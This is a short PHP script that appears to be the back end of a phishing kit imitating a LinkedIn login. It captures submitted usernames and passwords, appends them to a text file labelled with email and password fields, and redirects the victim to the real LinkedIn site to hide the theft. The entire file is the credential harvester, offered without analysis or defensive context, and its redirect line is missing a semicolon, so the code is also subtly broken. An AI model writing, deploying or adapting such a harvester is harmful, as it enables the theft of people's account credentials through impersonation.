<?php
$var = $_POST['UsernameForm'];
$var2 = $_POST['PasswordForm'];
file_put_contents("cat.txt", "[EMAIL]: " . $var . " [PASS]: " . $var2 . "\n", FILE_APPEND);
header('Location: https://linkedin.com/')
exit();
?>

